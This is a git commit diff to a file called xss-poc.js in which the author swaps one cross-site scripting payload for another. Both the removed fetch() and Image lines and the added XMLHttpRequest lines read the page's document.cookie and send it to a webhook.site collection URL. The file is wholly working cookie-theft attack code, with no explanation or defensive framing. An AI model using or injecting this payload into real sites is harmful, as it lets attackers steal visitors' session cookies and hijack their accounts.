7ff3516ed5660370fd2dc94ce7be6a20374eac43
CapperBoi <127835526+CapperBoi@users.noreply.github.com>
2023-03-14 12:07:47 +0100

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,3 +1,3 @@
-fetch("https://webhook.site/131ae3e1-53f5-4e7a-ae4a-f63552dcef3a/?cookie=" + document.cookie);
-
-var i=new Image;i.src="https://webhook.site/131ae3e1-53f5-4e7a-ae4a-f63552dcef3a/?cookie="+document.cookie;
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/131ae3e1-53f5-4e7a-ae4a-f63552dcef3a' + document.cookie, true);
+xhttp.send();
